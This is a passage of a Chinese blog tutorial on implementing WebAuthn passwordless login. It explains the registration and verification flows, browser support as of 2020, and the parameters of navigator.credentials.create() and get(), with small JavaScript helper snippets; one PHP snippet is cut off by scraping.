class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 